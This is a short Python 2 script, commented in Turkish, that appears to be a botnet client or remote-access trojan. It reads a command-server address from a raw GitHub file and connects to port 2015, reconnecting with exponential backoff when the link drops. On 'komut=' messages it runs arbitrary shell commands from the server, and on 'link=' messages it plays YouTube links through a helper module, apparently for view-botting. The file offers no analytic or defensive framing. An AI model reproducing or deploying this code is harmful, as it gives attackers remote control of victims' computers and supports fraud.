import socket
import urllib3
import time
import subprocess
from threading import Thread
import os
import deneizle
import errno

konum = os.path.dirname(os.path.abspath(__file__))
konum = konum.replace("\\","/")



def baglanti():
    
    def baglan():
        a=0
        while True:
            try:
                http = urllib3.PoolManager()
                ipno = http.request('GET', 'https://raw.githubusercontent.com/mertveflix3/deneme3/master/ip.txt').data
                print ipno
                
                s = socket.socket()
                s.connect((ipno,2015))
                return s
                break
            except:
                print "Baglanilamadi ", 30*(2**a), " Sn bekleniyor"
                time.sleep(30*(2**a))
                a+=1

    
    while True:
        s=baglan()
        while True:
            try:
                try:
                    mesaj=s.recv(1024)
                except socket.error as error:
                    if error.errno == errno.WSAECONNRESET:
                        s=baglan()
                        continue
                    else:
                        raise
                    
                if("m=" in mesaj):
                    mesaj=mesaj.replace("m=","")
                    if("link=" in mesaj):
                        print "Youtube Gorevi Algilandi"
                        gelenlink = mesaj.replace("link=","")
                        deneizle.izlet(gelenlink)
                    elif("komut=" in mesaj):
                        gelenkomut = mesaj.replace("komut=","")
                        subprocess.call(gelenkomut, shell=True)
                    else:
                        print mesaj
                elif("Hosgeldin->" in mesaj):
                     adresim = mesaj.replace("Hosgeldin->","")
                     print "Baglanildi"
                     print adresim
                     continue
                else:
                    pass
            except Exception as e:
                print(e)


th = Thread(target=baglanti,args=())
th.start()
    
